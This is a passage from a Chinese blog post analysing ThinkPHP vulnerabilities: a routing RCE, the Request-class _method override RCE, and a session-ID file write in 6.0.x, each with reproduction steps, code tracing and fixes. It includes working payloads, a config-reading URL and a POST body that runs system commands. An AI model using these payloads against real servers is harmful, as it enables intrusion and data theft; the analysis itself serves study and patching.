+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/localhost/</span><span class="string">?s</span>=index/think\config/get&amp;name=database.username <span class="comment"># 获取配置信息</span></span><br></pre></td></tr></table></figure>
+<p>会发现可以成功执行命令。接下来，我们直接在官方修改的 <strong>$controller</strong> 代码段打下断点。我们可以看到控制器的名字是从 <strong>$result</strong> 中获取的，而 <strong>$result</strong> 的值来源于兼容模式下的 <strong>pathinfo</strong> ，即 <strong>s</strong> 参数。</p>
+<p><img src="https://nc0.cdn.zkaq.cn/md/6508/856e97fe8ff106c17c4c6d8bf306a866_84302.png" alt=""></p>
+<p><img src="https://nc0.cdn.zkaq.cn/md/6508/85dcfaf1c65b3778ccbefb5dc7f194f7_32900.png" alt=""></p>
+<p>接着程序会跳回 <strong>App</strong> 类的 <strong>run</strong> 方法，进而调用 <strong>Dispatch</strong> 类的 <strong>run</strong> 方法，该方法会调用关键函数 <strong>exec</strong> ，我们跟进。</p>
+<p><img src="https://nc0.cdn.zkaq.cn/md/6508/fd414204b61db713e5179fc6357b4964_53512.png" alt=""></p>
+<p><img src="https://nc0.cdn.zkaq.cn/md/6508/db1387a7ae8c066a21fe8d5e0d95efcd_96930.png" alt=""></p>
+<p><img src="https://nc0.cdn.zkaq.cn/md/6508/0f2b2fb111bb68ffda3efc45933ee4fe_82127.png" alt=""></p>
+<p>在 <strong>exec</strong> 函数中，程序利用反射机制，调用类的方法。这里的类、方法、参数均是我们可以控制的。而且整个过程，并没有看到程序对控制器名的合法性进行检测，这也是导致 <strong>远程代码执行漏洞</strong> 的直接原因。</p>
+<p><img src="https://nc0.cdn.zkaq.cn/md/6508/1a8d6fb597efd751c62934e06e168cd1_56322.png" alt=""></p>
+<p>以上便是本漏洞的分析。综上，由于Windows的原因，所以有一些payload在windows的主机上是不可以利用的。</p>
+<p>那么哪些payload是可以兼容多个平台呢？</p>
+<p>由于windows自动加载类加载不到想要的类文件，所以能够下手的就是在框架加载的时候已经加载的类。</p>
+<p>5.1是下面这些：</p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">think<span class="symbol">\L</span>oader </span><br><span class="line">Composer<span class="symbol">\A</span>utoload<span class="symbol">\C</span>omposerStaticInit289837ff5d5ea8a00f5cc97a07c04561</span><br><span class="line">think<span class="symbol">\E</span>rror </span><br><span class="line">think<span class="symbol">\C</span>ontainer</span><br><span class="line">think<span class="symbol">\A</span>pp </span><br><span class="line">think<span class="symbol">\E</span>nv </span><br><span class="line">think<span class="symbol">\C</span>onfig </span><br><span class="line">think<span class="symbol">\H</span>ook </span><br><span class="line">think<span class="symbol">\F</span>acade</span><br><span class="line">think<span class="symbol">\f</span>acade<span class="symbol">\E</span>nv</span><br><span class="line">env</span><br><span class="line">think<span class="symbol">\D</span>b</span><br><span class="line">think<span class="symbol">\L</span>ang </span><br><span class="line">think<span class="symbol">\R</span>equest </span><br><span class="line">think<span class="symbol">\L</span>og </span><br><span class="line">think<span class="symbol">\l</span>og<span class="symbol">\d</span>river<span class="symbol">\F</span>ile</span><br><span class="line">think<span class="symbol">\f</span>acade<span class="symbol">\R</span>oute</span><br><span class="line">route</span><br><span class="line">think<span class="symbol">\R</span>oute </span><br><span class="line">think<span class="symbol">\r</span>oute<span class="symbol">\R</span>ule</span><br><span class="line">think<span class="symbol">\r</span>oute<span class="symbol">\R</span>uleGroup</span><br><span class="line">think<span class="symbol">\r</span>oute<span class="symbol">\D</span>omain</span><br><span class="line">think<span class="symbol">\r</span>oute<span class="symbol">\R</span>uleItem</span><br><span class="line">think<span class="symbol">\r</span>oute<span class="symbol">\R</span>uleName</span><br><span class="line">think<span class="symbol">\r</span>oute<span class="symbol">\D</span>ispatch</span><br><span class="line">think<span class="symbol">\r</span>oute<span class="symbol">\d</span>ispatch<span class="symbol">\U</span>rl</span><br><span class="line">think<span class="symbol">\r</span>oute<span class="symbol">\d</span>ispatch<span class="symbol">\M</span>odule</span><br><span class="line">think<span class="symbol">\M</span>iddleware</span><br><span class="line">think<span class="symbol">\C</span>ookie</span><br><span class="line">think<span class="symbol">\V</span>iew</span><br><span class="line">think<span class="symbol">\v</span>iew<span class="symbol">\d</span>river<span class="symbol">\T</span>hink</span><br><span class="line">think<span class="symbol">\T</span>emplate</span><br><span class="line">think<span class="symbol">\t</span>emplate<span class="symbol">\d</span>river<span class="symbol">\F</span>ile</span><br><span class="line">think<span class="symbol">\S</span>ession</span><br><span class="line">think<span class="symbol">\D</span>ebug</span><br><span class="line">think<span class="symbol">\C</span>ache</span><br><span class="line">think<span class="symbol">\c</span>ache<span class="symbol">\D</span>river</span><br><span class="line">think<span class="symbol">\c</span>ache<span class="symbol">\d</span>river<span class="symbol">\F</span>ile</span><br></pre></td></tr></table></figure>
+<p>5.0 的有：</p>
+<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">think<span class="string">\Route</span></span><br><span class="line">think<span class="string">\Config</span></span><br><span class="line">think<span class="string">\Error</span></span><br><span class="line">think<span class="string">\App</span></span><br><span class="line">think<span class="string">\Request</span></span><br><span class="line">think<span class="string">\Hook</span></span><br><span class="line">think<span class="string">\Env</span></span><br><span class="line">think<span class="string">\Lang</span></span><br><span class="line">think<span class="string">\Log</span></span><br><span class="line">think<span class="string">\Loader</span></span><br></pre></td></tr></table></figure>
+<p>两个版本公有的是：</p>
+<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">think<span class="string">\Route</span> </span><br><span class="line">think<span class="string">\Loader</span> </span><br><span class="line">think<span class="string">\Error</span> </span><br><span class="line">think<span class="string">\App</span> </span><br><span class="line">think<span class="string">\Env</span> </span><br><span class="line">think<span class="string">\Config</span> </span><br><span class="line">think<span class="string">\Hook</span> </span><br><span class="line">think<span class="string">\Lang</span> </span><br><span class="line">think<span class="string">\Request</span> </span><br><span class="line">think<span class="string">\Log</span></span><br></pre></td></tr></table></figure>
+<h3 id="0x03-漏洞修复-1"><a href="#0x03-漏洞修复-1" class="headerlink" title="0x03 漏洞修复"></a>0x03 漏洞修复</h3><p>参考官方文档或直接升级框架版本</p>
+<p><img src="https://nc0.cdn.zkaq.cn/md/6508/03124f56c1c1e04a84482bc3e38e2983_40877.png" alt=""></p>
+<h3 id="0x04-参考资料-1"><a href="#0x04-参考资料-1" class="headerlink" title="0x04 参考资料"></a>0x04 参考资料</h3><p><a href="https://xz.aliyun.com/t/3570" target="_blank" rel="noopener">https://xz.aliyun.com/t/3570</a></p>
+<h2 id="4-ThinkPHP-5-核心类-Request-远程代码漏洞分析"><a href="#4-ThinkPHP-5-核心类-Request-远程代码漏洞分析" class="headerlink" title="4. ThinkPHP 5 核心类 Request 远程代码漏洞分析"></a>4. ThinkPHP 5 核心类 Request 远程代码漏洞分析</h2><h3 id="0x00-背景-3"><a href="#0x00-背景-3" class="headerlink" title="0x00 背景"></a>0x00 背景</h3><p> Thinphp团队在实现框架中的核心类Requests的method方法实现了表单请求类型伪装，默认为$_POST[‘_method’]变量，却没有对$_POST[‘_method’]属性进行严格校验，可以通过变量覆盖掉Requets类的属性并结合框架特性实现对任意函数的调用达到任意代码执行的效果。</p>
+<p> 影响版本：ThinkPHP 5.0.x ~ 5.0.23 ThinkPHP 5.1.x ~ 5.1.31 ThinkPHP 5.2.0beta1</p>
+<h3 id="0x01-漏洞复现-2"><a href="#0x01-漏洞复现-2" class="headerlink" title="0x01 漏洞复现"></a>0x01 漏洞复现</h3><p>开启调试模式，位置为application/config.php</p>
+<p><img src="https://nc0.cdn.zkaq.cn/md/6508/f5d4000a348a2fe210b6afdc07c0f2cc_43711.png" alt=""></p>
+<p>Payload如下，通过POST提交触发漏洞</p>
+<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//localhost/thinkphp/public/index.php</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">POST:</span></span><br><span class="line"></span><br><span class="line">_method=__construct<span class="variable">&amp;filter</span>[]=system<span class="variable">&amp;server</span>[REQUEST_METHOD]=ls -al</span><br></pre></td></tr></table></figure>
+<p><img src="https://nc0.cdn.zkaq.cn/md/6508/09e4d3849ee025c0ad0fc8d6736042e5_28412.png" alt=""></p>
+<h3 id="0x02-漏洞分析-2"><a href="#0x02-漏洞分析-2" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h3><p>我们知道可以通过<code>http://localhost/public/index.php?s=index</code>的方式通过<code>s</code>参数传递具体的路由，根据入口文件可以直接跟到URL路由检测函数，关键代码如下：</p>
+<p><img src="https://nc0.cdn.zkaq.cn/md/6508/61ab4ffe4495591a5d09eda9eb63f423_71018.png" alt=""></p>
+<p>可以看到在进入<code>self::exec($dispatch, $config)</code>前，<code>$dispatch</code>的值是通过</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$dispatch = <span class="keyword">self</span>::routeCheck($request, $config)</span><br></pre></td></tr></table></figure>
+<p>设置的，这时候如果<code>debug</code>模式开启，就会调用<code>$request-&gt;param()</code>，也就是下面<code>exec()</code>中会调用到的函数，经过下面分析就能发现，在<code>debug</code>模式开启时就能直接触发漏洞，原理是一样的。</p>
+<p>进入<code>exec()</code>方法：</p>
+<p><img src="https://nc0.cdn.zkaq.cn/md/6508/79fe7d4267d5ea720c35b16389cca12e_26127.png" alt=""></p>
+<p><code>exec()</code>方法根据<code>$dispatch</code>的值选择进入不同的分支，当进入<code>method</code>分支时，调用<code>Request::instance()-&gt;param()</code>方法，跟进<code>param()</code>，看到调用了<code>Request</code>类的<code>method()</code>方法 ：</p>
+<p><img src="https://nc0.cdn.zkaq.cn/md/6508/7f663385cf7340baf87a78d09ef88649_94387.png" alt=""></p>
+<p>跟进<code>method</code>方法，通过官方的更新文档可知该函数是被改进的内容之一，在这个方法中，如果<code>method</code>等于<code>true</code>，则调用<code>$this-&gt;server()</code>方法：：</p>
+<p><img src="https://nc0.cdn.zkaq.cn/md/6508/7cfb18732582d59c45925d4b7f1d017c_12657.png" alt=""></p>
+<p>可见<code>server()</code>方法中调用了<code>input()</code>方法，然后调用<code>filterValue()</code>方法。然后filterValue中调用了<code>call_user_func()</code>方法：</p>
+<p><img src="https://nc0.cdn.zkaq.cn/md/6508/282c96274192cd4d961b2cbac6057124_64493.png" alt=""></p>
+<p><img src="https://nc0.cdn.zkaq.cn/md/6508/0e29c16203fddc1cc5de33a684bf3b2e_36857.png" alt=""></p>
+<p><img src="https://nc0.cdn.zkaq.cn/md/6508/cab68f6fc337145270faed95df03281b_55490.png" alt=""></p>
+<p>如果两个参数均可控，即<strong>$filter</strong>和<strong>$value</strong>，则会造成命令执行。</p>
+<p>那么观察两个参数：</p>
+<p>在getFilter()中设置了$filter值：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$filter = $filter ?: <span class="keyword">$this</span>-&gt;filter;</span><br></pre></td></tr></table></figure>
+<p>也即由$this-&gt;filter决定;</p>
+<p>$value为第一个参数$data，即为传入数组的值，由$this-&gt;server决定。</p>
+<p>$method变量是$this-&gt;method，其同等于POST的”method”参数值由于$this-&gt;method可控，导致可以调用_contruct()覆盖Request类的filter字段。</p>
+<h3 id="0x03-漏洞修复-2"><a href="#0x03-漏洞修复-2" class="headerlink" title="0x03 漏洞修复"></a>0x03 漏洞修复</h3><p>官方的修复方法是：在ThinkPHP5.0.24中，增加了对<code>$this-&gt;method</code>的判断，不允许再自由调用类函数。用户应尽快升级版本，并且不要开启debug模式，以免遭受攻击。</p>
+<h3 id="0x04-参考资料-2"><a href="#0x04-参考资料-2" class="headerlink" title="0x04 参考资料"></a>0x04 参考资料</h3><p><a href="https://paper.seebug.org/787/" target="_blank" rel="noopener">ThinkPHP5 核心类 Request 远程代码漏洞分析</a></p>
+<p><a href="http://blog.nsfocus.net/thinkphp-full-version-rce-vulnerability-analysis/?tdsourcetag=s_pctim_aiomsg" target="_blank" rel="noopener">THINKPHP 5.0.X-5.0.23、5.1.X、5.2.X 全版本远程代码执行漏洞分析</a></p>
+<h2 id="5-ThinkPHP-v6-0-0-v6-0-1任意文件写漏洞分析"><a href="#5-ThinkPHP-v6-0-0-v6-0-1任意文件写漏洞分析" class="headerlink" title="5. ThinkPHP v6.0.0-v6.0.1任意文件写漏洞分析"></a>5. ThinkPHP v6.0.0-v6.0.1任意文件写漏洞分析</h2><h3 id="0x00-背景-4"><a href="#0x00-背景-4" class="headerlink" title="0x00 背景"></a>0x00 背景</h3><p>年初，奇安信发布了 ThinkPHP 6.0 “任意”文件创建漏洞安全风险通告</p>
+<p>漏洞影响范围：top-think/framework 6.x &lt; 6.0.2</p>
+<h3 id="0x01-漏洞利用"><a href="#0x01-漏洞利用" class="headerlink" title="0x01 漏洞利用"></a>0x01 漏洞利用</h3><p>首先开启session（重点）：</p>
+<p><img src="https://nc0.cdn.zkaq.cn/md/6508/b0344de2af92b70cef9835233a8f2fb6_67585.png" alt=""></p>
+<p>在控制器文件index.php中加入以下代码，作用是用于获取name参数，并将之设置到session中。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">facade</span>\<span class="title">Session</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line"> Session::set(<span class="string">'name'</span>,<span class="string">'thinkphp'</span>);</span><br><span class="line"> <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://nc0.cdn.zkaq.cn/md/6508/1a57b3950fc88ffd708d31961df70d7e_69473.png" alt=""></p>
+<p>接下来访问主页，并且抓包修改PHPSESSION：</p>
+<p><img src="https://nc0.cdn.zkaq.cn/md/6508/8b43fd9f996d3b7a202280e6fdc47b4c_15515.png" alt=""></p>
+<p>查看seesion文件夹，已经有php文件存在：</p>
+<p><img src="https://nc0.cdn.zkaq.cn/md/6508/b892579f76ad5999c5086b42947de698_93773.png" alt=""></p>
+<h3 id="0x02-漏洞分析-3"><a href="#0x02-漏洞分析-3" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h3><p>参考通告可知是在存储session时导致的文件写入，跟进与session存储有关的函数。在save()方法中，调用了write()方法。</p>
+<p>位置：</p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D:<span class="symbol">\p</span>hpstudy_pro<span class="symbol">\W</span>WW<span class="symbol">\t</span>p6<span class="symbol">\v</span>endor<span class="symbol">\t</span>opthink<span class="symbol">\f</span>ramework<span class="symbol">\s</span>rc<span class="symbol">\t</span>hink<span class="symbol">\s</span>ession<span class="symbol">\S</span>tore.php</span><br></pre></td></tr></table></figure>
+<p><img src="https://nc0.cdn.zkaq.cn/md/6508/8cbe6a0d3c71df5b5a4c09f7de68d796_31063.png" alt=""></p>
+<p>查看write函数，可见在返回值处调用了writeFiles方法，继续跟进：</p>
+<p><img src="https://nc0.cdn.zkaq.cn/md/6508/f0e293839f12470ab599d149314d688c_48689.png" alt=""></p>
+<p>可见正是将字符串写文件的函数。</p>
+<p><img src="https://nc0.cdn.zkaq.cn/md/6508/3393821ee4665f2172529376d43fbdc0_92807.png" alt=""></p>
+<p>我们知道在与文件有关的漏洞中，写入文件的文件名、内容和路径是十分重要的。从write方法中可知本次漏洞的文件名来自于sessionid，而此id来自与一个getId方法，在其之上的setId方法中，当$id的长度为32时，便执行$this-&gt;$id赋值。</p>
+<p><img src="https://nc0.cdn.zkaq.cn/md/6508/1275a5f769d456baeca2d7520dd75a90_99317.png" alt=""></p>
+<p>继续跟踪到调用setId方法的位置,此处的cookieName值为PHPSESSION：</p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D:<span class="symbol">\p</span>hpstudy_pro<span class="symbol">\W</span>WW<span class="symbol">\t</span>p6<span class="symbol">\v</span>endor<span class="symbol">\t</span>opthink<span class="symbol">\f</span>ramework<span class="symbol">\s</span>rc<span class="symbol">\t</span>hink<span class="symbol">\m</span>iddleware<span class="symbol">\S</span>essionInit.php</span><br></pre></td></tr></table></figure>
+<p><img src="https://nc0.cdn.zkaq.cn/md/6508/945d87879a8b5bf8f4068d3795727f42_22132.png" alt=""></p>
+<p><img src="https://nc0.cdn.zkaq.cn/md/6508/a1994f3a32bef84fde9fcd21e82b19f0_47631.png" alt=""></p>
+<p>既然文件名可控，那么文件内容是否可控呢？跟据write方法可知文件内容就是sessData，即写入的内容就是创建session使用的内容。但是session的创建是由实际的后端业务逻辑来决定的，而默认环境下并没有创建session。所以在默认的环境之中，任意写文件是无法实现的。相对的，该漏洞可能造成的任意删除文件操作不需要苛刻的条件。</p>
+<p><img src="https://nc0.cdn.zkaq.cn/md/6508/449c7bfb8dd873525bb67dc13a41fdb8_48366.png" alt=""></p>
+<p><img src="https://nc0.cdn.zkaq.cn/md/6508/0c2dd265609a9031e2fe966164a58df1_68723.png" alt=""></p>
+<h3 id="0x03-漏洞修复-3"><a href="#0x03-漏洞修复-3" class="headerlink" title="0x03 漏洞修复"></a>0x03 漏洞修复</h3><p> 在6.0.2中，对session id使用了<code>ctype_alnum()</code>进行了判断，导致无法传递<code>.</code>等特殊字符，从而无法控制session文件为<code>.php</code>后缀。尽快升级到6.0.2版本以上即可。</p>
+<h3 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h3><p> 本次漏洞分析的原理方面并不困难，但是在复现的过程中遇到不少坑。除了要提前开启session，各种错误日志也是很有用的。</p>
+<h3 id="0x05-参考资料-1"><a href="#0x05-参考资料-1" class="headerlink" title="0x05 参考资料"></a>0x05 参考资料</h3><p><a href="https://paper.seebug.org/1114/" target="_blank" rel="noopener">https://paper.seebug.org/1114/</a></p>
+<p><a href="https://blog.csdn.net/zhangchensong168/article/details/104106869" target="_blank" rel="noopener">https://blog.csdn.net/zhangchensong168/article/details/104106869</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/study/" rel="tag"># study</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/06/16/JavaScript学习/" rel="next" title="JavaScript note">
+                <i class="fa fa-chevron-left"></i> JavaScript note
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/uploads/tou.jpg"
+                alt="Hyasin" />
+            
+              <p class="site-author-name" itemprop="name">Hyasin</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <!--<a href="/archives/"> -->
+                <a href="https://hyasin.github.io/archives/" target="_Self">
+              
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          <div class="links-of-author motion-element">
+            
+          </div>
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-ThinkPHP-5-0-10-3-2-3-缓存函数设计缺陷可导致代码执行"><span class="nav-number">1.</span> <span class="nav-text">1. ThinkPHP 5.0.10-3.2.3 缓存函数设计缺陷可导致代码执行</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00-背景"><span class="nav-number">1.1.</span> <span class="nav-text">0x00 背景</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-实验环境"><span class="nav-number">1.2.</span> <span class="nav-text">0x01 实验环境</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-漏洞利用"><span class="nav-number">1.3.</span> <span class="nav-text">0x02 漏洞利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-漏洞分析"><span class="nav-number">1.4.</span> <span class="nav-text">0x03 漏洞分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04-修复方案"><span class="nav-number">1.5.</span> <span class="nav-text">0x04 修复方案</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x05-参考资料"><span class="nav-number">1.6.</span> <span class="nav-text">0x05 参考资料</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-ThinkPHP-5-x-变量覆盖导致的文件包含-amp-任意代码执行"><span class="nav-number">2.</span> <span class="nav-text">2. ThinkPHP 5.x 变量覆盖导致的文件包含&amp;任意代码执行</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00-背景-1"><span class="nav-number">2.1.</span> <span class="nav-text">0x00 背景</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-漏洞复现"><span class="nav-number">2.2.</span> <span class="nav-text">0x01 漏洞复现</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-漏洞分析"><span class="nav-number">2.3.</span> <span class="nav-text">0x02 漏洞分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-漏洞修复"><span class="nav-number">2.4.</span> <span class="nav-text">0x03 漏洞修复</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04-参考资料"><span class="nav-number">2.5.</span> <span class="nav-text">0x04 参考资料</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-ThinkPHP-5-0-x-未开启强制路由导致的RCE-漏洞分析"><span class="nav-number">3.</span> <span class="nav-text">3. ThinkPHP 5.0.x 未开启强制路由导致的RCE 漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00-背景-2"><span class="nav-number">3.1.</span> <span class="nav-text">0x00 背景</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-漏洞复现-1"><span class="nav-number">3.2.</span> <span class="nav-text">0x01 漏洞复现</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-漏洞分析-1"><span class="nav-number">3.3.</span> <span class="nav-text">0x02 漏洞分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-漏洞修复-1"><span class="nav-number">3.4.</span> <span class="nav-text">0x03 漏洞修复</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04-参考资料-1"><span class="nav-number">3.5.</span> <span class="nav-text">0x04 参考资料</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-ThinkPHP-5-核心类-Request-远程代码漏洞分析"><span class="nav-number">4.</span> <span class="nav-text">4. ThinkPHP 5 核心类 Request 远程代码漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00-背景-3"><span class="nav-number">4.1.</span> <span class="nav-text">0x00 背景</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-漏洞复现-2"><span class="nav-number">4.2.</span> <span class="nav-text">0x01 漏洞复现</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-漏洞分析-2"><span class="nav-number">4.3.</span> <span class="nav-text">0x02 漏洞分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-漏洞修复-2"><span class="nav-number">4.4.</span> <span class="nav-text">0x03 漏洞修复</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04-参考资料-2"><span class="nav-number">4.5.</span> <span class="nav-text">0x04 参考资料</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-ThinkPHP-v6-0-0-v6-0-1任意文件写漏洞分析"><span class="nav-number">5.</span> <span class="nav-text">5. ThinkPHP v6.0.0-v6.0.1任意文件写漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00-背景-4"><span class="nav-number">5.1.</span> <span class="nav-text">0x00 背景</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-漏洞利用"><span class="nav-number">5.2.</span> <span class="nav-text">0x01 漏洞利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-漏洞分析-3"><span class="nav-number">5.3.</span> <span class="nav-text">0x02 漏洞分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-漏洞修复-3"><span class="nav-number">5.4.</span> <span class="nav-text">0x03 漏洞修复</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04-总结"><span class="nav-number">5.5.</span> <span class="nav-text">0x04 总结</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x05-参考资料-1"><span class="nav-number">5.6.</span> <span class="nav-text">0x05 参考资料</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Hyasin</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.3</div>
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
